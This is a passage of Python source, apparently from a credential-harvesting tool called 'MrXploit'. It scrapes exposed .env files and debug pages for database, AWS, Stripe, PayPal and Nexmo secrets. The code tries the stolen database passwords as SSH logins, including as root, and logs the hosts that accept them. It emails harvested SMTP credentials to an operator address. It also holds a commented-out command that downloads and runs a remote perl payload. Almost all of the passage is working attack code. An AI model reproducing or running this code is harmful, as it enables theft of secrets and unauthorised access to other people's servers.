                smtp.login(user, password)
                code = smtp.ehlo()[0]
                if not (200 <= code <= 299):
                    code = smtp.helo()[0]
                    if not (200 <= code <= 299):
                        raise SMTPHeloError(code, resp)
                smtp.sendmail(user, toaddr, msg.as_string())
                return 'live'
            except Exception as e:
                #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
                return 'die'
        else:
            try:
                fromaddr = fromaddr = str(user)
                toaddr = emailnow
                body = "Mailer smtp\n{}:{}:{}:{}:{}:ssl::::0:".format(host, port, user, password,fromaddr)
                mims = MIMEText(body, 'plain')
                msg = MIMEMultipart('alternative')
                msg['Subject'] = "📪 SMTP [{}]".format(host)
                msg['From'] = fromaddr
                msg['To'] = toaddr
                msg.attach(mims)
                smtp = smtplib.SMTP(host, port)
                smtp.ehlo()
                smtp.starttls()
                smtp.login(user, password)
                code = smtp.ehlo()[0]
                if not (200 <= code <= 299):
                    code = smtp.helo()[0]
                    if not (200 <= code <= 299):
                        raise SMTPHeloError(code, resp)
                smtp.sendmail(user, toaddr, msg.as_string())
                return 'live'
            except Exception as e:
                #print('Error on line {}'.format(sys.exc_info()[-1].tb_lineno), type(e).__name__, e)
                return 'die'
class MrXploit:
	def get_Vps(sel, text, url):
		if 'DB_PASSWORD' in text and 'DB_HOST' in text:
			if '://' in url:
				parse = url.split('://', 2)
				parse = parse[1]
				parse = parse.split('/')
				host = parse[0]
			else:
				parse = parse.split('/')
				host = parse[0]

			# grab password
			if 'DB_USERNAME=' in text:
				method = './env'
				db_user = re.findall("\nDB_USERNAME=(.*?)\n", text)[0]
				db_pass = re.findall("\nDB_PASSWORD=(.*?)\n", text)[0]
			elif '<td>DB_USERNAME</td>' in text:
				method = 'debug'
				db_user = re.findall('<td>DB_USERNAME<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				db_pass = re.findall('<td>DB_PASSWORD<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]

			# login ssh
			if db_user and db_pass:
				connected = 0
				ssh = paramiko.SSHClient()
				ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
				try:
					ssh.connect(host, 22, db_user, db_pass, timeout=3)
					fp = open('Results/Vps.txt', 'a+')
					build = str(host)+'|'+str(db_user)+'|'+str(db_pass)+'\n'
					remover = str(build).replace('\r', '')
					fp.write(remover + '\n\n')
					fp.close()
					connected += 1
				except:
					pass
				finally:
					if ssh:
						ssh.close()

				if db_user != 'root':
					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					try:
						ssh.connect(host, 22, 'root', db_pass, timeout=30)
						fp = open('Results/Vps.txt', 'a+')
						build = str(host)+'|'+str(db_user)+'|'+str(db_pass)+'\n'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()

				if '_' in db_user:
					aw, iw = db_user.split('_')
					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					#stdin, stdout, stderr = ssh.exec_command("cd /tmp; wget -qO - narcio.com/lans1|perl; curl -s narcio.com/lans1|perl")
					try:
						ssh.connect(host, 22, iw, db_pass, timeout=30)
						fp = open('Results/Vps.txt', 'a+')
						build = str(host)+'|'+str(db_user)+'|'+str(db_pass)+'\n'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()

					ssh = paramiko.SSHClient()
					ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
					try:
						ssh.connect(host, 22, aw, db_pass, timeout=30)
						fp = open('Results/Vps.txt', 'a+')
						build = str(host)+'|'+str(db_user)+'|'+str(db_pass)+'\n'
						remover = str(build).replace('\r', '')
						fp.write(remover + '\n\n')
						fp.close()
						connected += 1
					except:
						pass
					finally:
						if ssh:
							ssh.close()

				if connected > 0:
					return connected
				else:
					return False
		else:
			return False
	def get_nexmo(self, text, url):
		if 'NEXMO_KEY=' in text:
			key = re.findall('NEXMO_KEY=(.*?)\n', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('NEXMO_SECRET=(.*?)\n', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])

				with open(o_nexmo2, 'a') as ff:
					ff.write(satu + '\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{key}{res}:{fc}{sec}{fc}]")


		elif 'NEXMO_API_KEY=' in text:
			key = re.findall('NEXMO_API_KEY=(.*?)\n', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('NEXMO_API_SECRET=(.*?)\n', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])
				with open(o_nexmo2, 'a') as ff:
					ff.write(satu + '\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{key}{res}:{fc}{sec}{fc}]")
		elif 'NEXMO_KEY' in text:
			key = re.findall('<td>NEXMO_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('<td>NEXMO_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '' or key == '******':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])
				with open(o_nexmo2, 'a') as ff:
					ff.write(satu + '\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{key}{res}:{fc}{sec}{fc}]")
		elif 'NEXMO_API_KEY' in text:
			key = re.findall('<td>NEXMO_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('<td>NEXMO_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '' or key == '******':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])
				with open(o_nexmo2, 'a') as ff:
					ff.write(satu + '\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{key}{res}:{fc}{sec}{fc}]")
		elif 'SMS_API_KEY' in text:
			key = re.findall('<td>SMS_API_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in key:
				key = key.replace('\r', '')
			sec = re.findall('<td>SMS_API_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
			if '\r' in sec:
				sec = sec.replace('\r', '')
			if key == '""' or key == 'null' or key == '' or key == '******':
				return False
			else:
				satu = cleanit(url + '|' + str(key) + "|" + str(sec))
				login_nexmo(url, satu.split('|')[1], satu.split('|')[2])
				with open(o_nexmo2, 'a') as ff:
					ff.write(satu + '\n')
				print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}NEXMO {fc}[{yl}{key}{res}:{fc}{sec}{fc}]")
	def payment_api(self, text, url):

		if "PAYPAL_" in text:
			save = open(o_sandbox,'a')
			save.write(url+'\n')
			save.close()
			return True
		elif "STRIPE_KEY" in text:
			if "STRIPE_KEY=" in text:
				method = '/.env'
				try:
					stripe_key = reg('\nSTRIPE_KEY=(.*?)\n', text)[0]
				except:
					stripe_key = ''
				try:
					stripe_secret = reg('\nSTRIPE_SECRET=(.*?)\n', text)[0]
				except:
					stripe_secret = ''
			elif "<td>STRIPE_SECRET</td>" in text:
				method = 'debug'
				try:
					stripe_key = reg('<td>STRIPE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				except:
					stripe_key = ''
				try:
					stripe_secret = reg('<td>STRIPE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>', text)[0]
				except:
					stripe_secret = ''
			build = 'URL: '+str(url)+'\nMETHOD: '+str(method)+'\nSTRIPE_KEY: '+str(stripe_key)+'\nSTRIPE_SECRET: '+str(stripe_secret)
			remover = str(build).replace('\r', '')
			save = open(o_stripe, 'a')
			save.write(remover+'\n')
			save.close()
			saveurl = open(o_stripe_site,'a')
			removerurl = str(url).replace('\r', '')
			saveurl.write(removerurl+'\n')
			saveurl.close()
		else:
			return False
	
	def get_aws_region(self, text):
		reg = False
		for region in list_region.splitlines():
			if str(region) in text:
				return region
				break
	def get_raw_mode(self, text, url):
		try:
			if "email-smtp." in text:
				if "<html>" in text:
					method = 'debug'
				else:
					method = '.env'

				build = str(url)+' | '+str(method)
				remover = str(build).replace('\r', '')
				save = open('Results/manual/MANUAL_SES.txt', 'a')
				save.write(remover+'\n')
				save.close()
				return True
			else:
				return False
		except:
			return False
	def get_aws_data(self, text, url):
		try:
			if "AWS_ACCESS_KEY_ID" in text:
				if "AWS_ACCESS_KEY_ID=" in text:
					method = '/.env'
					try:
						aws_key = reg("\nAWS_ACCESS_KEY_ID=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SECRET_ACCESS_KEY=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_ACCESS_KEY_ID</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_ACCESS_KEY_ID<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_KEY" in text:
				if "AWS_KEY=" in text:
					method = '/.env'
					try:
						aws_key = reg("\nAWS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					try:
						aws_buc = reg("\nAWS_BUCKET=(.*?)\n", text)[0]
					except:
						aws_buc = ''
				elif "<td>AWS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
					try:
						aws_buc = reg("<td>AWS_BUCKET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_buc = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_SNS_KEY" in text:
				if "AWS_SNS_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_SNS_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SNS_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						sms_from = reg("\nSMS_FROM=(.*?)\n", text)[0]
					except:
						sms_from = ''
					try:
						sms_driver = reg("\nSMS_DRIVER=(.*?)\n", text)[0]
					except:
						sms_deiver = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_SNS_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_SNS_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SNS_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						sms_from = reg("<td>SMS_FROM=<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						sms_from = ''
					try:
						sms_driver = reg("<td>SMS_DRIVER<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						sms_driver = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_S3_KEY" in text:
				if "AWS_S3_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_S3_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_S3_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_S3_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_SES_KEY" in text:
				if "AWS_SES_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_SES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "SES_KEY" in text:
				if "SES_KEY=" in text:
					method = '/.env'
					try:
					   aws_key = reg("\nSES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nSES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "AWS_ACCESS_KEY_ID_2" in str(text):
				if "AWS_ACCESS_KEY_ID_2=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nAWS_ACCESS_KEY_ID_2=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nAWS_SECRET_ACCESS_KEY_2=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>AWS_ACCESS_KEY_ID_2</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>AWS_ACCESS_KEY_ID_2<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>AWS_SECRET_ACCESS_KEY_2<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "FILESYSTEMS_DISKS_S3_KEY" in str(text):
				if "FILESYSTEMS_DISKS_S3_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nFILESYSTEMS_DISKS_S3_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nFILESYSTEMS_DISKS_S3_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>FILESYSTEMS_DISKS_S3_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>FILESYSTEMS_DISKS_S3_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>FILESYSTEMS_DISKS_S3_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "DYNAMODB_KEY" in str(text):
				if "DYNAMODB_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nDYNAMODB_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nDYNAMODB_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>DYNAMODB_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>DYNAMODB_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>DYNAMODB_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "STORAGE_KEY" in str(text):
				if "STORAGE_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\nSTORAGE_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\nSTORAGE_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>STORAGE_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>STORAGE_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>STORAGE_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
					print(f"{yl}☆ [{gr}{ntime()}{red}] {fc}╾┄╼ {gr}AWS {fc}[{yl}{aws_key}{res}:{fc}{aws_sec}{fc}]")
					save = open('Results/'+str(aws_reg)[:-2]+'.txt', 'a')
					save.write(remover+'\n\n')
					save.close()
					it = f"{aws_key}:{aws_sec}:{aws_reg}"
					begin_check(it, to=emailnow)
					ceker_aws(url,aws_key,aws_sec,aws_reg)
					build_forchecker = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover2 = str(build_forchecker).replace('\r', '')
					save3 = open(o_aws_screet2,'a')
					save3.write(remover2+'\n')
					save3.close()
				return True
			elif "#MAIL_SES_KEY" in str(text):
				if "#MAIL_SES_KEY=" in str(text):
					method = '/.env'
					try:
					   aws_key = reg("\n#MAIL_SES_KEY=(.*?)\n", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("\n#MAIL_SES_SECRET=(.*?)\n", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				elif "<td>#MAIL_SES_KEY</td>" in text:
					method = 'debug'
					try:
						aws_key = reg("<td>#MAIL_SES_KEY<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_key = ''
					try:
						aws_sec = reg("<td>#MAIL_SES_SECRET<\/td>\s+<td><pre.*>(.*?)<\/span>", text)[0]
					except:
						aws_sec = ''
					try:
						asu = MrXploit().get_aws_region(text)
						if asu:
							aws_reg = asu
						else:
							aws_reg = ''
					except:
						aws_reg = ''
				if aws_reg == "":
					aws_reg = "aws_unknown_region--"
				if aws_key == "" and aws_sec == "":
					return False
				else:
					build = str(aws_key)+"|"+str(aws_sec)+"|"+str(aws_reg)
					remover = str(build).replace('\r', '')
